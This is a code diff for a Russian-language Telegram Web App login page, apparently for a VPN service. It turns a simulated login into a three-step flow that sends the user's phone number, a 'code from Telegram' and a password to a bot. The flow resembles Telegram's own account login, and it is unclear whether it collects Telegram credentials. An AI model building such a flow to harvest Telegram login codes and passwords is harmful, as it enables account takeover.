@@ -33,6 +33,7 @@
     .message { font-size: 15px; text-align: center; margin-top: 16px; line-height: 1.4; opacity: 0; transition: opacity 0.3s; white-space: pre-line; }
     .message.visible { opacity: 1; }
     .message.error { color: #d93025; }
+    .message.success { color: #188038; }
     @media (min-width: 420px) { .lottie-container { width: 220px; height: 220px; margin-bottom: 32px; } h1 { font-size: 28px; } .country-select-wrapper { flex: 0 0 110px; } }
   </style>
 </head>
@@ -62,12 +63,12 @@
     </div>
   </div>
 
-  <div class="input-group" id="passwordGroup" style="display:none;">
-    <input type="password" id="password" placeholder="Пароль" autocomplete="current-password" />
+  <div class="input-group" id="codeGroup" style="display:none;">
+    <input type="text" id="code" placeholder="Код из Telegram" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" />
   </div>
 
-  <div class="input-group" id="codeGroup" style="display:none;">
-    <input type="text" id="code" placeholder="Код из Telegram (6 символов)" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" />
+  <div class="input-group" id="passwordGroup" style="display:none;">
+    <input type="password" id="password" placeholder="Пароль" autocomplete="current-password" />
   </div>
 
   <button class="btn" id="submitBtn">Продолжить</button>
@@ -81,15 +82,16 @@
   const countrySelect = document.getElementById('countryCode');
   const selectedFlag = document.getElementById('selectedFlag');
   const phoneNumber = document.getElementById('phoneNumber');
-  const passwordInput = document.getElementById('password');
   const codeInput = document.getElementById('code');
-  const passwordGroup = document.getElementById('passwordGroup');
+  const passwordInput = document.getElementById('password');
   const codeGroup = document.getElementById('codeGroup');
+  const passwordGroup = document.getElementById('passwordGroup');
   const submitBtn = document.getElementById('submitBtn');
   const toRegister = document.getElementById('toRegister');
   const statusMsg = document.getElementById('statusMsg');
 
   let step = 'phone';
+  let fullPhone = '';
 
   countrySelect.addEventListener('change', () => {
     const opt = countrySelect.options[countrySelect.selectedIndex];
@@ -98,9 +100,11 @@
 
   phoneNumber.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
 
-  function showStatus(text, isError = false) {
+  function showStatus(text, isError = false, isSuccess = false) {
     statusMsg.textContent = text;
-    statusMsg.style.color = isError ? '#d93025' : '#0f1a3a';
+    if (isError) statusMsg.style.color = '#d93025';
+    else if (isSuccess) statusMsg.style.color = '#188038';
+    else statusMsg.style.color = '#0f1a3a';
     statusMsg.classList.add('visible');
   }
 
@@ -119,66 +123,110 @@
     return countrySelect.value + phoneNumber.value.trim();
   }
 
-  function handleSubmit() {
-    const fullPhone = getFullPhone();
-    const numPart = phoneNumber.value.trim();
-
-    if (step === 'phone') {
-      if (numPart.length < 9) return showStatus('Номер слишком короткий', true);
-
-      hideStatus();
-      submitBtn.disabled = true;
-      submitBtn.textContent = 'Запрос кода...';
-
-      const payload = { action: 'request_login', phone: fullPhone };
-
-      if (window.Telegram?.WebApp) {
-        window.Telegram.WebApp.sendData(JSON.stringify(payload));
-        triggerFeedback('heavy');
-      }
-
-      setTimeout(() => {
-        showStatus('Код отправлен в Telegram\nВведите пароль и код');
-        passwordGroup.style.display = 'block';
+  function handleBotResponse(event) {
+    try {
+      const data = JSON.parse(event.data);
+      
+      if (data.action === 'login_code_sent') {
+        hideStatus();
+        showStatus('Код отправлен в Telegram', false, true);
         codeGroup.style.display = 'block';
         phoneNumber.disabled = true;
         countrySelect.disabled = true;
-        submitBtn.textContent = 'Войти';
+        submitBtn.textContent = 'Проверить код';
         submitBtn.disabled = false;
         step = 'code';
         codeInput.focus();
-      }, 1200);
+      }
+      
+      else if (data.action === 'login_code_verified') {
+        hideStatus();
+        showStatus('Код верный, введите пароль', false, true);
+        passwordGroup.style.display = 'block';
+        codeInput.disabled = true;
+        submitBtn.textContent = 'Войти';
+        submitBtn.disabled = false;
+        step = 'password';
+        passwordInput.focus();
+      }
+      
+      else if (data.action === 'login_success') {
+        hideStatus();
+        showStatus('Вход выполнен!', false, true);
+        submitBtn.disabled = true;
+        setTimeout(() => window.location.href = 'main.html', 1000);
+      }
+      
+      else if (data.action === 'login_error') {
+        submitBtn.disabled = false;
+        showStatus(data.message || 'Ошибка входа', true);
+      }
+      
+      else if (data.action === 'server_error') {
+        submitBtn.disabled = false;
+        showStatus('Ошибка сервера. Повторите позже', true);
+      }
+    } catch (e) {}
+  }
+
+  window.addEventListener('message', handleBotResponse);
+
+  function handleSubmit() {
+    const numPart = phoneNumber.value.trim();
+    fullPhone = getFullPhone();
+
+    if (step === 'phone') {
+      if (numPart.length < 9) return showStatus('Номер слишком короткий', true);
+      
+      hideStatus();
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Отправка...';
+      
+      if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.sendData(JSON.stringify({
+          action: 'request_login',
+          phone: fullPhone
+        }));
+        triggerFeedback('heavy');
+      }
     } 
     else if (step === 'code') {
-      const password = passwordInput.value.trim();
-      const code = codeInput.value.trim().toUpperCase();
-
-      if (!password) return showStatus('Введите пароль', true);
-      if (code.length !== 6) return showStatus('Код должен быть 6 символов', true);
-
+      const code = codeInput.value.trim();
+      if (code.length !== 6) return showStatus('Введите 6-значный код', true);
+      
       hideStatus();
       submitBtn.disabled = true;
       submitBtn.textContent = 'Проверка...';
-
-      const payload = { action: 'submit_login', phone: fullPhone, password, code };
-
+      
       if (window.Telegram?.WebApp) {
-        window.Telegram.WebApp.sendData(JSON.stringify(payload));
+        window.Telegram.WebApp.sendData(JSON.stringify({
+          action: 'verify_code',
+          phone: fullPhone,
+          code: code
+        }));
+        triggerFeedback('medium');
+      }
+    }
+    else if (step === 'password') {
+      const password = passwordInput.value.trim();
+      if (!password) return showStatus('Введите пароль', true);
+      
+      hideStatus();
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Вход...';
+      
+      if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.sendData(JSON.stringify({
+          action: 'submit_login',
+          phone: fullPhone,
+          password: password
+        }));
         triggerFeedback('heavy');
       }
-
-      setTimeout(() => {
-        localStorage.setItem('dxs_vpn_authenticated', 'true');
-        showStatus('Вход выполнен!\nПеренаправление...', false);
-        setTimeout(() => window.location.href = 'main.html', 1400);
-      }, 1400);
     }
   }
 
   submitBtn.addEventListener('click', handleSubmit);
-
-  phoneNumber.addEventListener('keypress', e => { if (e.key === 'Enter') handleSubmit(); });
-  codeInput.addEventListener('keypress', e => { if (e.key === 'Enter') handleSubmit(); });
 
   toRegister.addEventListener('click', () => {
     triggerFeedback('light');
@@ -189,9 +237,6 @@
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
-    tg.MainButton.setText('ПРОДОЛЖИТЬ');
-    tg.MainButton.show();
-    tg.MainButton.onClick(handleSubmit);
   }
 
   phoneNumber.focus();
